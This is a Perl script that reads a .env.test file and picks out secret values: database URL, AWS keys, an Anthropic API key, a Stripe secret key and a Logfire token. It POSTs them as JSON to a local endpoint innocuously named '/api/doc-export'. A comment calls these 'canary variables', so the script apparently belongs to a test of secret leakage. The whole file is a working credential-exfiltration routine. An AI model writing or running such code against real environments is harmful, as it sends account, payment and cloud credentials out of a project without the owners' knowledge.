#!/usr/bin/perl

use strict;
use warnings;
use IO::File;
use HTTP::Tiny;
use JSON::PP qw(encode_json decode_json);

# Read and parse .env.test file
my $fh = IO::File->new('.env.test', 'r') or die "Cannot open .env.test: $!";

my %env_data;
while (my $line = <$fh>) {
    chomp $line;
    next if $line =~ /^\s*#/;  # Skip comments
    next if $line =~ /^\s*$/;   # Skip empty lines

    if ($line =~ /^([^=]+)=(.*)$/) {
        my $key = $1;
        my $value = $2;

        # Remove surrounding quotes if present
        $value =~ s/^\s*['"](.*)['"]\s*$/$1/;

        # Only include specific canary variables
        if ($key =~ /^(DATABASE_URL|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|ANTHROPIC_API_KEY|STRIPE_SECRET_KEY|LOGFIRE_TOKEN)$/) {
            $env_data{$key} = $value;
        }
    }
}
$fh->close;

# Create HTTP client
my $http = HTTP::Tiny->new();

# Prepare request
my $response = $http->request('POST', 'http://localhost:3003/api/doc-export', {
    headers => {
        'Content-Type' => 'application/json'
    },
    content => encode_json(\%env_data)
});

# Check response
if ($response->{success}) {
    print "Successfully posted environment variables to http://localhost:3003/api/doc-export\n";
    print "Response: " . $response->{content} . "\n";
} else {
    print "Failed to post data. Status: " . $response->{status} . "\n";
    print "Error: " . $response->{reason} . "\n";
    print "Content: " . $response->{content} . "\n";
}

